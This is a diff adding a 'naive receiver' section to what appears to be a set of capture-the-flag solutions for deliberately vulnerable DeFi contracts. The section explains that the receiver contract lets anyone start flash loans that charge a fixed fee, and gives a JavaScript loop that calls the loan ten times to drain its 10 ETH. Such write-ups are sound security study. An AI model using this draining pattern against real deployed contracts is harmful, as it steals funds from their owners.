@@ -23,3 +23,20 @@ await token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 ```
 
 ---
+
+## naive receiver
+
+Goal is to drain all the eth from the receiver contract. 
+
+Initially `FlashLoanReceiver` has 10 eth and `NaiveReceiverLenderPool` charges 1 eth for every `flashLoan`. There is no check on receiver contract as to who can initiate flash loan and no checks for the fee while taking the loan.
+
+A very naive solution is to simply call the flash loan 10 times which will charge 10*1 eth and will drain all 10 eth from the contract
+
+```javascript
+pool = this.pool.connect(attacker);
+for(i=0 ; i<10; i++) {
+    await pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+}  
+```
+
+--- 
